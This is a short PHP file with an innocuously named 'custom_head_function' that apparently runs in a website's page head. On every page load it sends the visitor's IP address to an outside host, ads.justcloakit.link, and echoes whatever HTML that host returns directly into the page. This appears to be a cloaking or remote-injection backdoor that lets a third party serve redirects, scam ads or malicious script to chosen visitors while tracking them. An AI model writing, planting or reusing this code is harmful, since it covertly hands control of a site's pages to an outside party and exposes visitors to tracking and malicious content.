<?php

function getClientIp() {
    if ( !empty( $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] ) ) {
        $ip = explode( ',', $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] )[ 0 ];
    } elseif ( !empty( $_SERVER[ 'HTTP_X_REAL_IP' ] ) ) {
        $ip = $_SERVER[ 'HTTP_X_REAL_IP' ];
    } elseif ( !empty( $_SERVER[ 'HTTP_REAL_IP' ] ) ) {
        $ip = $_SERVER[ 'HTTP_REAL_IP' ];
    } elseif ( !empty( $_SERVER[ 'HTTP_CF_CONNECTING_IP' ] ) ) {
        $ip = $_SERVER[ 'HTTP_CF_CONNECTING_IP' ];
    } else {
        $ip = $_SERVER[ 'REMOTE_ADDR' ];
    }
    return trim( $ip );
}

function custom_head_function() {
    $curl = curl_init();
    $ip = getClientIp();
    curl_setopt_array( $curl, array(
        CURLOPT_URL => 'https://ads.justcloakit.link/website/get-link-status/?param=83&adds=' . $ip,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPGET => true,
        CURLOPT_FOLLOWLOCATION => true,
    ) );
    $response = json_decode( curl_exec( $curl ) );
    $is_active = $response->is_active;
    $link = $response->link;
    $html = $response->html;
    if ( !curl_errno( $curl ) ) {
        echo $html;
    }
    curl_close( $curl );
}
custom_head_function();
?>